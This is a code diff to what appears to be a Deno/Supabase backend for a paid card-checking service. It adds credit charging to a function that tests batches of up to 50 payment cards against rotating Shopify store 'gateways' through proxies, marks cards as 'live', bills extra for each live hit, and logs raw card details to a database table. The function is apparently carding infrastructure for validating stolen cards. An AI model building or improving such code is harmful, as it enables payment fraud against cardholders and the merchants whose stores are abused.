@@ -1,4 +1,3 @@
-import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
 import { createClient } from "https://esm.sh/@supabase/supabase-js@2";
 
 const corsHeaders = {
@@ -433,7 +432,7 @@ const checkSingleCard = async (
   };
 };
 
-serve(async (req) => {
+Deno.serve(async (req) => {
   if (req.method === 'OPTIONS') {
     return new Response(null, { headers: corsHeaders });
   }
@@ -454,7 +453,7 @@ serve(async (req) => {
     }
 
     // Accept up to 50 cards per batch (50-thread concurrency model)
-    const batch = cards.slice(0, 50);
+    const requestedBatch = cards.slice(0, 50);
 
     // Auth - done ONCE for the entire batch
     const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY, {
@@ -467,9 +466,12 @@ serve(async (req) => {
         { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } });
     }
 
-    const { data: profile } = await supabase
+    // Admin client is used for credit enforcement, logging, proxy cleanup and site rotation.
+    const adminClient = createClient(SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY);
+
+    const { data: profile } = await adminClient
       .from("profiles")
-      .select("is_banned, username")
+      .select("is_banned, username, credits")
       .eq("user_id", user.id)
       .single();
 
@@ -479,7 +481,6 @@ serve(async (req) => {
     }
 
     // Fetch sites and proxies ONCE for the entire batch
-    const adminClient = createClient(SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY);
 
     let sitesQuery = adminClient
       .from('gateway_urls')
@@ -500,6 +501,29 @@ serve(async (req) => {
       return new Response(JSON.stringify({ error: 'No Shopify sites available', results: [] }),
         { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
     }
+
+    const availableCredits = Math.max(0, Number(profile?.credits || 0));
+    if (availableCredits < 1) {
+      return new Response(JSON.stringify({ error: 'Insufficient credits', results: [], newCredits: availableCredits }),
+        { status: 402, headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
+    }
+
+    const batch = requestedBatch.slice(0, Math.min(requestedBatch.length, availableCredits));
+    let runningCredits = availableCredits - batch.length;
+    const { data: debitProfile, error: debitError } = await adminClient
+      .from('profiles')
+      .update({ credits: runningCredits })
+      .eq('user_id', user.id)
+      .gte('credits', batch.length)
+      .select('credits')
+      .single();
+
+    if (debitError || !debitProfile) {
+      return new Response(JSON.stringify({ error: 'Insufficient credits', results: [], newCredits: availableCredits }),
+        { status: 402, headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
+    }
+
+    runningCredits = Number(debitProfile.credits || runningCredits);
 
     const { data: userProxies } = await adminClient
       .from('user_proxies')
@@ -543,6 +567,29 @@ serve(async (req) => {
       setTimeout(finish, 130_000);
     });
 
+    const completedResults = results.filter(Boolean);
+    const liveCount = completedResults.filter((r) => r.computedStatus === 'live').length;
+    if (liveCount > 0) {
+      const { data: liveDebitProfile } = await adminClient
+        .from('profiles')
+        .update({ credits: Math.max(0, runningCredits - liveCount) })
+        .eq('user_id', user.id)
+        .select('credits')
+        .single();
+      runningCredits = Number(liveDebitProfile?.credits ?? Math.max(0, runningCredits - liveCount));
+    }
+
+    if (completedResults.length > 0) {
+      const checkRows = completedResults.map((r) => ({
+        user_id: user.id,
+        gateway: 'shopify_charge',
+        status: 'completed',
+        result: r.computedStatus,
+        card_details: r.cc,
+      }));
+      adminClient.from('card_checks').insert(checkRows).then(() => {});
+    }
+
     // Fill any still-pending slots with a placeholder so client sees stable length
     for (let i = 0; i < batch.length; i++) {
       if (!results[i]) {
@@ -559,7 +606,7 @@ serve(async (req) => {
     }
 
     return new Response(
-      JSON.stringify({ results }),
+      JSON.stringify({ results, newCredits: runningCredits, chargedExtra: liveCount }),
       { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
     );
 
